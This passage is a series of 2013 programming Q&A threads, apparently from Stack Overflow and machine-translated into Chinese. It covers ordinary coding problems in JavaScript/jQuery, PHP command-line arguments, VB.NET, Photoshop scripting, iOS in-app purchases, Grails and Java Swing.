## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T14:15:22.603

Soft float 是配置**gcc**的一个选项，它是开源的，任何人都可以配置带有/不支持*软浮动*的工具链。有关构建您自己的编译器的工具，请参见[http://crosstool-ng.org/ 。](http://crosstool-ng.org/)我从正在使用*gcc 4.1.2的引用链接中获取它；*您可能会拥有最好的运气`-mfloat-abi=softfp`。ARM 上有三种变体。[Debian ARM 浮点 wiki](http://wiki.debian.org/ArmHardFloatPort)很好地描述了这些差异。[Debian VFP 比较](http://wiki.debian.org/ArmHardFloatPort/VfpComparison)也可能很有趣。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-14T15:40:02.203

看看这个网站。它似乎可以解决问题

[http://www.eliteraspberries.com/blog/2013/08/cflags-for-numerical-computing-on-the-raspberry-pi.html](http://www.eliteraspberries.com/blog/2013/08/cflags-for-numerical-computing-on-the-raspberry-pi.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-14T11:40:58.627

尝试`gcc`选项：

`-mno-soft-float`

# javascript - 如何将 readAsDataURL() 的值分配给变量？

> ID：15998610
> 
> 赞同：3
> 
> 时间：2013-04-14T11:35:32.210
> 
> 标签：javascript, jquery, file-upload, filereader

好的，所以我看到了很多关于使用 readAsDataURL() 的示例和问题，但似乎没有一个可以解决我的问题。以下是我的代码：

```
$(document).ready(function(){
    var fileReader = new FileReader();
    $("form").submit(function(e){
        e.preventDefault();
        console.log(fileReader.readAsDataURL(document.getElementById("userfile").files[0]));
    });
}); 
```

我在控制台中得到的是`undefined`。我正在尝试获取变量上的 base64 编码文件数据，以便我可以使用 ajax 上传它。谁能告诉我我做错了什么？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-14T11:50:32.570

实例的大多数方法[`FileReader`](https://developer.mozilla.org/en/docs/DOM/FileReader)异步报告结果。

您必须绑定一个`onload`事件来捕获结果：

```
var fileReader = new FileReader();
fileReader.onload = function(event) {
    console.log(event.target.result);
};
fileReader.readAsDataURL(document.getElementById("userfile").files[0]); 
```

# c# - 需要一个正则表达式来拆分字符串

> ID：15998611
> 
> 赞同：1
> 
> 时间：2013-04-14T11:35:55.067
> 
> 标签：c#, regex

我需要一个允许我在 c# 中拆分以下字符串的正则表达式：

> 产品名称：产品名称一些文字 adfasd asdfas 数量：1 基本价格：999.00
> 
> 供应商产品 ID : text-text-text-text

得到这个结果

```
text
text
text
text 
```

“-”重复 2 到 5 次

注意：这个模式是大模式的一部分，所以我不能使用 string.split

我试试这个`(-?(.+?)?-?(.+?)?-?(.+?)?)\s`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:38:35.963

怎么样`([a-zA-Z]+)(?:-([a-zA-Z]+)){0,3}`

# javascript - 如何更改输入的值？

> ID：15998613
> 
> 赞同：0
> 
> 时间：2013-04-14T11:36:04.960
> 
> 标签：javascript, jquery

我有一个动态添加输入、文本和选择元素的表单。

表单的 ID 是`#user-form`，我需要更改`input/select/text`此表单中出现的元素的值。

其中一个表单项在页面加载时隐藏，这就是我将其包含`input:hidden`在选择中的原因。

一个元素的 HTML 输出示例如下所示：

```
<input id="slider-coll" class="enq-form-input form-text" type="text" maxlength="128" size="10" value="" name="slider_coll"> 
```

我当前使用 jQuery 的代码如下所示：

```
sliderForm.find('#user-form').find('.enq-form-input, .enq-form-select, input:hidden').change(function() {
    inputValue = $(this).val();
    console.log(inputValue);
    $(this).val(inputValue);

  if (catchValue && feetValue) {
      calculateAmounts(catchValue, feetValue);
    }
}); 
```

我将`catchValue`&定义`feetValue`为 change 函数之外的全局变量。此表单还使用 jQuery 滑块插件。

`Console.log`返回正确的值，但我无法获取要更新的实际输入值。

`calculateAmounts`是一个 ajax 函数，只要更改任何值就需要触发。

现在`catchValue`&`feetValue`正在返回 false，即使`console.log`返回正确的值也是如此。

我可能错过了一些简单的东西，有人知道如何解决这个问题吗？

***** 根据书呆子的要求* *******

 **`calculateAmounts`在下面，但这不是问题。当我针对单个强制更改对其进行测试时，它会起作用。我的问题是输入的值没有更新。

```
function calculateAmounts(catchValue, feetValue) {
  jQuery.ajax({
    type: 'POST',
    url: '/calculateAmounts/ajax',
    dataType: 'json',
    success: ajaxCalcAmountsCompleted,
      data: {
        catchValue:catchValue,
        feetValue:feetValue
      }
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:11:03.220

```
inputValue = $(this).val();
console.log(inputValue);
$(this).val(inputValue); 
```

为什么要将输入值更改为自身？

还有，你说的`catchValue`和`feetValue`都是假的，所以`calculateAmounts`不会被调用。

此外，`sliderForm.find('#user-form')`尝试在其自身中查找表单`$(#user-form)`就足够了，因为 id 在文档中是唯一的

您说您正在尝试更改输入的值，但是`.change`每当更改值时都会调用一个事件。

你的意思是这样的吗？

```
$('#user-form').
    find('.enq-form-input, .enq-form-select, input:hidden').
    each(function() {
        inputValue = $(this).val();

        $(this).val("new text"); //whatever new value for the input

        //do something with inputValue ..

        if (catchValue && feetValue) {
           calculateAmounts(catchValue, feetValue);
        }
    }); 
```**

# vb.net - 操作必须使用可更新查询 Vb.net 桌面应用程序错误

> ID：15998615
> 
> 赞同：0
> 
> 时间：2013-04-14T11:36:09.320
> 
> 标签：vb.net, ms-access, vba

我部署了我的 Vb.net 桌面应用程序。但我在访问 datbase(.mdb 文件) 上遇到错误

> 操作必须使用可更新查询

我正在使用 Access .mdb 文件来存储数据。我得到了这个[链接](https://stackoverflow.com/questions/15989611/operation-must-use-an-updateable-query-after-deployment)来解决这个问题，但这是手动的方法。因此，当我的应用程序安装在客户端计算机上时，他们必须手动完成。

还有什么避免手动方式的解决方案？

请帮助我被困在这里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-16T08:59:08.053

If your application is installing a copy of the database on each computer as is implied by the link, are you sure that's what you want? No data will be shared between each computer. Otherwise, what the link is saying to do, is rethink the location of the database, and get the installer to put it somewhere with read and write permission, not the application directory.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-06T03:26:54.780

我假设您通过 Visual Studio 安装程序创建了 .MSI 文件。我也遇到了您的问题，我使用的解决方案是将其默认目录从更改`[Program Files]`为`[WindowsVolume][ProductName]`- 它将通过`C:\YourApp\`. 由于错误是由于*用户*无法在数据库上写入，我尝试从程序文件更改其目录并重新安装。这个对我有用。

# vb.net - 如何与手动打开的 Outlook 分开终止 Outlook.Application 对象？

> ID：15998619
> 
> 赞同：0
> 
> 时间：2013-04-14T11:36:30.707
> 
> 标签：vb.net, outlook.application

此代码将从任务管理器结束进程 OUTLOOK.EXE。如果用户已经单独打开了他的 Outlook，它也会被关闭。这是用户不能接受的。

```
Dim objOLApp As Outlook.Application
.
.
.
.
Call objOLApp.Quit()  
Call System.Runtime.InteropServices.Marshal.ReleaseComObject(objOLApp)   
objOLApp = Nothing 
```

* * *

我通过删除找到了解决方案：`Call objOLApp.Quit()`

现在还有另一个问题。OUTLOOK.EXE 不会在关闭程序并关闭 Outlook 窗口后终止（以防它被打开）。我必须从任务管理器做（结束进程）。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T16:51:36.747

自动化 Outlook 是出了名的笨拙，它实际上是一个客户端应用程序。根据您尝试关闭 Outlook 的事实，我猜您使用它来处理电子邮件框或联系人或日历条目或其他内容。

我建议您花几美元并使用[“Outlook Redemption”](http://www.dimastr.com/redemption/download.htm)

如果您确实需要确保关闭 Outlook，则以下方式应该可以工作并且应该是相当非侵入性的。

```
Sub CloseOutlook()
    Dim pros() As Process = Process.GetProcessesByName("Outlook")
    For Each p As Process In pros
        p.CloseMainWindow()
        If Not p.WaitForExit(15000) then ' wait up to 15sec to close
            Try 'force close below
                p.Kill() 'hazardous call.
            Catch ex As Exception

            End Try
        End If
    Next
End Sub 
```

# php - Selenium 服务器没有响应

> ID：15998623
> 
> 赞同：1
> 
> 时间：2013-04-14T11:36:58.350
> 
> 标签：php, selenium, phpunit

我的设置是这样的：

1.  最新的 Selenium 服务器
2.  最新的 Phpunit 和 Selenium 插件
3.  Firefox 3.6（即使没有 Selenium IDE 也没有安装插件）

好的，最后我的代码是这样的：

```
<?php
class TestLogin extends PHPUnit_Extensions_Selenium2TestCase
{
    public function setUp()
    {
        $this->setHost('localhost');
        $this->setPort(4444);
        $this->setBrowser('firefox');
        $this->setBrowserUrl('http://localhost');
        $this->prepareSession();
        $this->url('http://localhost');
    }

    public function testSignupFormFor()
    {
         $this->url('http://localhost/ci/index.php/signup/signupController/signup');

         $div = $this->byCssSelector('div#signupFormId');
         $form =$this->byCssSelector('div#signupFormId>form');
         $userObj = $this->byName("userName");

         $userName = $userObj->value('root');   -----> Server hangs here

         $this->assertEquals('root',$userName);
?> 
```

当我使用 phpunit filename.php 运行代码时，它会打开 firefox 并挂起消息

当我看到服务器的日志是这样的

```
16:55:36.608 INFO - Executing: [send keys: 2 org.openqa.selenium.support.events.EventFiringWebDriver$EventFiringWebEleme
nt@8e7c2cfc, [r, o, o, t]] at URL: /session/b0da54ee-6029-4ff6-b0b7-2d9b44cbb81c/element/2/value)
16:56:36.631 INFO - Executing: [delete session: b0da54ee-6029-4ff6-b0b7-2d9b44cbb81c] at URL: /session/b0da54ee-6029-4ff
6-b0b7-2d9b44cbb81c) 
```

有人可以帮帮我吗？

# c# - 用于 asp.net MVC onclick 事件的 DevExpress 组件按钮调用了两次

> ID：15998624
> 
> 赞同：1
> 
> 时间：2013-04-14T11:37:14.363
> 
> 标签：c#, asp.net-mvc, devexpress

我有下一个问题。我正在使用`ASP.NET MVC 4`, 和`DevExpress`组件。我有按钮：

```
 @Html.DevExpress().Button(settings =>
            {
                settings.Name = "LoginSubmit";
                settings.UseSubmitBehavior = false;
                settings.ClientSideEvents.Click = "LogIn";

            }).GetHtml() 
```

当我单击此按钮功能 LogIn 被调用两次。

但是当我用简单的 html 替换 DevExpress 按钮扩展时一切正常，并且函数 LogIn() 只被调用一次：

```
<button onclick="javascript:LogIn();" type="button">Enter</button> 
```

有人对此问题有任何解决方法吗？非常感谢任何提前。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T09:22:52.480

等了很久才得到答案，发现了很多其他的bug，决定`DevExpress`for`ASP.NET MVC`还是不稳定。所以我不建议在企业 `ASP.NET MVC`应用中使用它！

**已编辑**

在 DevExpress 的新版本发布后，这个 bug 可以这样修复：

```
settings.ClientSideEvents.Click = "function(){LogIn();}"; 
```

希望对您有所帮助

# php - 检查 PHP 中的命令行参数

> ID：15998632
> 
> 赞同：8
> 
> 时间：2013-04-14T11:38:25.707
> 
> 标签：php

我想将两个不同的参数传递给我的脚本，并根据发送的参数，我需要我的脚本做一些事情。但我不知道如何定义我的条件语句。

更准确地说，我希望我的脚本在我传递“搜索”参数时进行搜索，或者在我传递“显示”参数时显示结果。

这是我的代码：

```
if ($argc > 1) {
  if ($argv[0] == 'show') {
    for ($i = 0; $i <= $argv[2]; $i++) {
      //do something
    }
  }
  elseif($argv[0] == 'search') {
    //do something
  }
} else {
  echo "no argument passed\n";
} 
```

“IF”语句没有检查我的传递参数是“搜索”还是“显示”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-14T11:47:32.577

`$argv[0]` is the name of the script, that's why your code doesn't work.

If I have a file script.php:

```
<?php
if ($argc > 1) {
  if ($argv[1] == 'show') {
    for ($i = 0; $i <= $argv[2]; $i++) {
      print "show passed\n";
    }
  }
  elseif($argv[1] == 'search') {
    print "search passed";
  }
} else {
  echo "no argument passed\n";
} 
```

Testing gives:

```
$php script.php 
```

> no argument passed

```
$php script.php search 
```

> search passed

```
$php script.php show 2

show passed
show passed
show passed 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-12-16T10:12:30.713

为什么不？

```
$aPassedOptions = getopt("", ['show', 'search']);
$bShow = isset($aPassedOptions['show']);
$bSearch = isset($aPassedOptions['search']);
var_dump($aPassedOptions, $bShow, $bSearch);

script.php --show
script.php --search
script.php --show --search 
```

更多 @ [http://www.php.net/getopt](http://www.php.net/getopt) （例如，需要参数等）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-14T11:44:17.107

我会改用`switch/case`你的条件（`$argc`）是错误的，因为你需要动作名称和参数并且`$argv[0]`是脚本名称，所以你的`command`is`argv[1]`和它的参数`argv[2]`以及向上。我也会`argc/argv`从`$_SERVER`全球获得

```
if ($_SERVER['argc'] >= 3) {
  switch( $_SERVER['argv'][1] ) {
     case 'show':
        ...
        break;

     case 'search':
        ...
        break;
   }
} else {
   // no args case
} 
```

一般来说，尝试 ie 通常很有用

```
var_dump($_SERVER); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-14T11:44:41.237

试试`$argv[1]`吧

[http://php.net/manual/en/reserved.variables.argv.php](http://php.net/manual/en/reserved.variables.argv.php)

`$argv[0]`包含被调用的脚本的名称

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-14T11:47:30.293

Use $argv[1].

In UNIX model (like...C), the traditional ARGV array starts with the first binary invoked, then passes along the arguments. In PHP case, if you call your script through PHP ("php script.php") instead of hash-banging it ("./script.php"), php automatically removes itself from $argv[0].

So in your case:

```
$ cat argv.php
#!/usr/bin/php
<?php
    print_r($argv);
?>
$ php argv.php search
Array
(
    [0] => argv.php
    [1] => search
)
$ ./argv.php search
Array
(
    [0] => ./argv.php
    [1] => search
)
$ 
```

# javascript - 如何使用相对坐标在 Photoshop 中使用 JavaScript 移动图层

> ID：15998640
> 
> 赞同：0
> 
> 时间：2013-04-14T11:39:55.647
> 
> 标签：javascript, photoshop, vertical-alignment, layer, mask

我刚开始使用 JS 到 Photoshop。我需要在 as 之间对齐 2 层或更多层？例如 - 在顶部。每一层都有一个比图像小的蒙版。使用 Photoshop 菜单，我可以只对齐图像，而不对齐蒙版。我想对齐蒙版上的图像 - 通过蒙版可见到同一级别的图像。谢谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T16:26:07.287

mm如果要转换图层（或图层蒙版），请使用这三个功能。你没有提到你使用的是什么版本的PS。

*   selectmask - 选择图层中的图层蒙版作为活动
*   linkUnlinkLayermask - 将图层蒙版链接或取消链接到它的图层
*   transformLayerLayer - 将图层（或图层蒙版）偏移多个像素

您应该能够根据需要操作图层并对齐它们。

```
//pref pixels
app.preferences.rulerUnits = Units.PIXELS;

var deltaX = 0
var deltaY = 20

selectMask("Layer 1")
linkUnlinkLayermask(false)
transformLayer(deltaX, deltaY)

function transformLayer(moveX, moveY)
{
    var id442 = charIDToTypeID( "Trnf" );
    var desc93 = new ActionDescriptor();
    var id443 = charIDToTypeID( "null" );
    var ref64 = new ActionReference();
    var id444 = charIDToTypeID( "Lyr " );
    var id445 = charIDToTypeID( "Ordn" );
    var id446 = charIDToTypeID( "Trgt" );
    ref64.putEnumerated( id444, id445, id446 );
    desc93.putReference( id443, ref64 );
    var id447 = charIDToTypeID( "FTcs" );
    var id448 = charIDToTypeID( "QCSt" );
    var id449 = charIDToTypeID( "Qcsa" );
    desc93.putEnumerated( id447, id448, id449 );
    var id450 = charIDToTypeID( "Ofst" );
    var desc94 = new ActionDescriptor();
    var id451 = charIDToTypeID( "Hrzn" );
    var id452 = charIDToTypeID( "#Pxl" );
    desc94.putUnitDouble( id451, id452, deltaX );
    var id453 = charIDToTypeID( "Vrtc" );
    var id454 = charIDToTypeID( "#Pxl" );
    desc94.putUnitDouble( id453, id454, deltaY );
    var id455 = charIDToTypeID( "Ofst" );
    desc93.putObject( id450, id455, desc94 );
    executeAction( id442, desc93, DialogModes.NO );
}

function selectMask(LayerName)
{
    var id2380 = charIDToTypeID( "slct" );
    var desc475 = new ActionDescriptor();
    var id2381 = charIDToTypeID( "null" );
    var ref352 = new ActionReference();
    var id2382 = charIDToTypeID( "Chnl" );
    var id2383 = charIDToTypeID( "Chnl" );
    var id2384 = charIDToTypeID( "Msk " );
    ref352.putEnumerated( id2382, id2383, id2384 );
    var id2385 = charIDToTypeID( "Lyr " );
    ref352.putName( id2385, LayerName );
    desc475.putReference( id2381, ref352 );
    var id2386 = charIDToTypeID( "MkVs" );
    desc475.putBoolean( id2386, false );
    executeAction( id2380, desc475, DialogModes.NO );
}

    function linkUnlinkLayermask(bool)
{
    var id2415 = charIDToTypeID( "setd" );
    var desc483 = new ActionDescriptor();
    var id2416 = charIDToTypeID( "null" );
    var ref359 = new ActionReference();
    var id2417 = charIDToTypeID( "Lyr " );
    var id2418 = charIDToTypeID( "Ordn" );
    var id2419 = charIDToTypeID( "Trgt" );
    ref359.putEnumerated( id2417, id2418, id2419 );
    desc483.putReference( id2416, ref359 );
    var id2420 = charIDToTypeID( "T   " );
    var desc484 = new ActionDescriptor();
    var id2421 = charIDToTypeID( "Usrs" );
    desc484.putBoolean( id2421, bool );
    var id2422 = charIDToTypeID( "Lyr " );
    desc483.putObject( id2420, id2422, desc484 );
    executeAction( id2415, desc483, DialogModes.NO );
} 
```

# android - 是否重新安装与升级相同的 Android 应用

> ID：15998644
> 
> 赞同：1
> 
> 时间：2013-04-14T11:40:51.370
> 
> 标签：android, upgrade

我对升级android应用程序有疑问。我对代码进行了更改并更改了版本。然后尝试在设备中安装。所以我收到提示“卸载以前的应用程序并重新安装”。但实际上我需要检查升级是如何工作的。我在谷歌发现没有卸载以前的应用程序，新的应用程序可以通过执行重新安装来安装。

我在命令行中尝试过

```
adb install -r app_name.apk 
```

但是我没有找到该命令用于升级的任何地方。到处都提到仅重新安装。我真的很怀疑两者**是否相同。那就是重新安装是否与升级android应用程序相同。** 谁能帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:58:00.777

根据我的经验，每当我点击更新 android 中的应用程序时，它都会检查/比较版本，如果它有可用的更新版本，它会卸载以前的版本并安装新版本。

但不同的是，当它更新时，应用程序设置、用户首选项等也会随着新版本保持不变。

请分享，如果您对此有不同的体验。

# jquery - jquery检测更多在后台输入的键并返回作为最后一个键？

> ID：15998647
> 
> 赞同：0
> 
> 时间：2013-04-14T11:41:04.723
> 
> 标签：jquery, keystore

我对键盘事件感到有点失落。

我想检测最后输入的最后 10 个字符，return 作为最后一个字符。

知道如何实施吗？我不是要代码，而是要逻辑和指导方针。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T11:46:21.853

Make an array and store all events in it, removing the front element when the length is > 10, and use that array when you get "return" as input.

Pseudocode:

```
var events = [];
function keypress(e) {
  if(e == "return") {
    console.log(events);
  }
  events.push(e);
  if(events.length > 10) {
    events.shift();
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T12:11:02.233

看到您正在使用 jQuery，您可以绑定到`keyup`事件，然后在键入时将数据存储在数组中，类似于：

```
<input id="myText"></input> 
```

```
var textString = [];

$('#myText').on('keyup', function(eventData){
    if(eventData.which === 13){ // check if enter/return was pressed
        // It wasn't clear what you wanted to happen exactly on enter, 
        // so as an example the code simply alerts the last 10 chars.
        alert('Enter was pressed. Your last 10 chars were: ' + textString.join(''));
        return;
    }

    textString.push(this.value.slice(-1)); // store last character type in the array

    // if adding the last entry increased the array passed the 10 characters
    // remove the one from the beginning of the array
    if(textString.length > 10){
        textString.shift();
    }
}) 
```

* * *

[**DEMO**](http://jsfiddle.net/nm4TV/) - 绑定`keup`事件并存储最后 10 个字符

* * *

当您要求使用 jQuery 时，上面的代码使用 jQuery 的[**on()**](http://api.jquery.com/on/)绑定到指定输入元素的[**keyup**](http://api.jquery.com/keyup/)事件。

一旦进入事件，代码将使用 JavaScript 的[**Array.push()**](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/push)将新元素添加到数组的末尾，并使用 JavaScript 的[**Array.shift()**](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/shift)删除数组中的第一个元素。

为了获取最后输入的字符，代码使用 JavaScript 的[**String.slice()**](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/slice)提取字符串的特定部分。

要将数组的值显示为警报中的字符串，代码使用 JavaScript 的[**Array.join()**](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/join)。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T11:46:17.590

What you can do is to match the button you press with keycode, ie:

```
var code = (e.keyCode ? e.keyCode : e.which);
if(code == 13) { //Enter keycode
   //Do something
} 
```

With this code if someone press "enter" you can do something.

Check this to know all the possible keycodes: [http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

Hope it help.

# ios - 单个产品的 InApp 消耗品购买？

> ID：15998649
> 
> 赞同：1
> 
> 时间：2013-04-14T11:41:26.460
> 
> 标签：ios, xcode, in-app-purchase

我已经按照[Ray Wenderlichs](http://www.raywenderlich.com/23266)创建了一个示例项目，它运行良好。但我只有一个产品，我想要的是在一个按钮中单击它应该购买该产品。当我谷歌几个小时时，我得到了一个解决方案[应用内购买](https://stackoverflow.com/questions/14168407/in-app-purchase-with-an-ibaction-button)使用与我的要求完全相同[的 IBAction / Button 。](https://stackoverflow.com/questions/14168407/in-app-purchase-with-an-ibaction-button)但是，当我使用代码时，我会弃用“paymentWithProductIdentifier”。有没有办法使用像“com.example.product”这样的inapp购买对象进行购买？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T14:50:44.767

你需要传递 skproduct 而不是它的标识符，这并没有太大的不同，你只需要事先请求产品，这样你在付款时就可以使用它。

```
//This is how you request the products with a list of identifiers

SKProductsRequest *request = [[SKProductsRequest alloc] initWithProductIdentifiers:self.productIdentifiers];
[request setDelegate:self];
[request start];

//This is the delegate method called after there is a response from apple servers

-(void) productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response
{
    self.products = response.products;

    for (SKProduct *product in self.products)
    {
        if ([product.productIdentifier isEqualToString:MY_PRODUCT_IDENTIFIER])
        {
            self.myProduct = product;
        }
    }
}

//And this is how you do the actual payment after product is retrieved

SKPayment * payment = [SKPayment paymentWithProduct:self.myProduct];
[[SKPaymentQueue defaultQueue] addPayment:payment]; 
```

据我所知，事务部分的工作方式与教程中的相同，因为我经历了相同的教程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T12:53:40.027

尝试使用[MKStoreKit](https://github.com/MugunthKumar/MKStoreKit)，它会让你的生活更轻松。

# python - 使用 ScraperWiki 从 div 元素中获取信息

> ID：15998653
> 
> 赞同：0
> 
> 时间：2013-04-14T11:41:58.613
> 
> 标签：python, web-scraping, scraperwiki

有没有办法使用[ScraperWiki](https://scraperwiki.com/docs/python/python_intro_tutorial/)从 div 容器中获取数据？我有一行 HTML，类似于：

```
<div id="karte_data_aktuelle_temperatur___CHA" class="karte_text_hidden">
    <span style="font-size: 10px;">9.0</span>
    <br/>
</div> 
```

我想刮掉`...CHA`and `9.0`。值 (9.0) 不是问题，因为这可以通过 CSS 选择器来完成，但我怎样才能获得该`...CHA`值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T14:15:40.277

我意识到这不是 scraperwiki，而是 BeautifulSoup，无论如何都要检查一下。

```
html = r"""<div id="karte_data_aktuelle_temperatur___CHA" class="karte_text_hidden">
    <span style="font-size: 10px;">9.0</span>
    <br/>
</div>"""

from bs4 import BeautifulSoup

soup = BeautifulSoup(html)
elem = soup.find('div')

print elem['id'], 'is the id'
print elem.text, 'is the value' #9.0 
```

# grails - 将我的 gsp 页面转换为 pdf 时出现错误

> ID：15998656
> 
> 赞同：1
> 
> 时间：2013-04-14T11:42:10.217
> 
> 标签：grails

错误堆栈跟踪：

```
org.xml.sax.SAXParseException: The entity name must immediately follow the '&' in the entity reference.
    at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source)
    at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transformIdentity(TransformerImpl.java:638)
    at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:709)
    at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:313)
    at org.xhtmlrenderer.resource.XMLResource$XMLResourceBuilder.createXMLResource(XMLResource.java:189)
    at org.xhtmlrenderer.resource.XMLResource.load(XMLResource.java:75)
    at org.xhtmlrenderer.resource.XMLResource$load.call(Unknown Source)
    at grails.plugin.rendering.document.XhtmlDocumentService.createDocument(XhtmlDocumentService.groovy:55)
    at grails.plugin.rendering.document.XhtmlDocumentService.createDocument(XhtmlDocumentService.groovy:43)
    at grails.plugin.rendering.document.XhtmlDocumentService.createDocument(XhtmlDocumentService.groovy:38)
    at grails.plugin.rendering.document.XhtmlDocumentService$createDocument.call(Unknown Source)
    at grails.plugin.rendering.RenderingService.render(RenderingService.groovy:34)
    at grails.plugin.rendering.RenderingService.render(RenderingService.groovy:33)
    at grails.plugin.rendering.RenderingService$render$0.callCurrent(Unknown Source)
    at grails.plugin.rendering.RenderingService.render(RenderingService.groovy:63)
    at grails.plugin.rendering.RenderingService$render.call(Unknown Source)
    at RenderingGrailsPlugin$_closure1.doCall(RenderingGrailsPlugin.groovy:48)
    at RenderingGrailsPlugin$_closure1.call(RenderingGrailsPlugin.groovy)
    at com.zocampus.ExamScoresController$_closure31.doCall(ExamScoresController.groovy:525)
    at com.zocampus.ExamScoresController$_closure31.doCall(ExamScoresController.groovy)
    at org.grails.jaxrs.web.JaxrsFilter.doFilterInternal(JaxrsFilter.java:46)
    at java.lang.Thread.run(Thread.java:619) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T13:15:10.743

**观察：**

*   您正在使用 Grails 渲染插件。
*   您在 gsp 中有一个元素，其文本中有一个“&”。例如：标签为`<p>S & P 500</p>`

**解决方案：** 字符串需要编码为 HTML。在您期望 '&' 的 gsp 中使用`.encodeAsHTML()`。

示例 gsp 代码：

```
var abc = "S & P 500";
<p>abc.encodeAsHTML()</p> 
```

# appcelerator - Appcelerator合金导航跨平台示例

> ID：15998657
> 
> 赞同：-1
> 
> 时间：2013-04-14T11:42:17.263
> 
> 标签：appcelerator, titanium-alloy

我希望有人能帮帮忙，

我正在尝试跨平台保持相同的 GUI，并且我希望在子页面的顶部有一个后退按钮，以便用户可以返回到 iOS 和 android 上的上一页。

我已经实现了一种适用于 android 的方法，但同样的代码在 iOS 上崩溃，我稍后会发布代码，但我只是想知道是否有人已经有一个很好的例子，没有必要重新发明轮子等等。

感谢大家

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:42:58.037

没关系找到原因，如果有人有一个很好的例子，我很乐意看到它，因为我现在看起来像一个黑客。

标题视图

```
<Alloy>
<View id="container">
    <View id="back">
        <ImageView id="backImage"/>
    </View>

</View> 
```

子视图

```
<Alloy>
<Window>
    <View id="mainView">
        <Require src="header" id="header"/>
        <View id="scroller"></View>
        <View id="MsgText">
            <Label id="lblUpcomingEventsMsg" textid="UpcomingEventsMsg" />
            <Label id="lblPleaseSelect" textid="PleaseSelect" />
        </View>
        <View id="TableContainer">
            <TableView id="Eventstable" dataCollection="events" dataFilter="whereFunction" dataTransform="transformFunction">
                <Require src="Eventrow"/>
            </TableView>
        </View>
    </View>
</Window> 
```

标头 JS

```
$.back.addEventListener('click', function() {
    if ($.back.enabled) { 
        $.trigger('back'); 
        } 
```

});

$.back.on 导致 ios 中的异常适用于 android

# java - 为什么我的 JScrollPane 不显示我的 JPanel？

> ID：15998665
> 
> 赞同：0
> 
> 时间：2013-04-14T11:43:14.627
> 
> 标签：java, swing, jpanel, jscrollpane, layout-manager

我有一个 JPanel，我希望它能够滚动，所以我将它添加到 JScrollPane，但我的 JScrollPane 没有完全显示我的面板。只显示了它的一个很小的角落，它也不会滚动。但是当我只将 LPanel 添加到我的 JFrame 时，它​​会正确显示！有人可以告诉我我在这里做错了什么吗？

关于我的代码的信息：

*   LPanel 是从 JPanel 扩展而来的，我已经覆盖了油漆。但正如我所说，油漆效果很好！它有自己的宽度和高度，即 2^k。
*   k 是我的面板中的行数。

这是我的代码：

```
public class Graphics extends JFrame {
  LPanel panel;
  int k;
  public Graphics(int k1) {
    setLayout(null);
    this.k = k1;
    panel = new LPanel(k);
    panel.setSize(panel.width * 30, panel.height * 30);
    new CoveringwithLs(k, panel);
    JScrollPane pane = new JScrollPane(panel);
    pane.setLocation(20, 20);
    if (k < 4) {
      pane.setSize(panel.width * 30, panel.height * 30);
      this.setSize(panel.width * 30 + 80, panel.height * 30 + 80);
    } else {
      pane.setSize(panel.width * 30, 600);
      this.setSize(panel.width * 30 + 80, 600);
    }
    getContentPane().add(pane);
    this.setDefaultCloseOperation(EXIT_ON_CLOSE);
    setVisible(true);
  }
  public static void main(String[] args) {
    new Graphics(3);
  }
} 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T18:20:38.037

> 我不能添加一个例子，

当然可以。你已经有了。现在您需要做的是遵循给出的建议并使用布局管理器而不是空布局。

> LPanel 是从 JPanel 扩展而来的，我已经覆盖了油漆。

自定义绘画是通过重写`paintComponent()`方法完成的，而不是 paint() 方法。

> 它有自己的宽度和高度，即 2^k。

您需要覆盖`getPreferredSize()`面板的方法以返回尺寸。然后滚动窗格将正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:48:45.483

Have you added the scrolls to the ScrollPane. e.g.

```
 JScrollPane pane = new JScrollPane(panel, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_ALWAYS); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-14T18:37:54.467

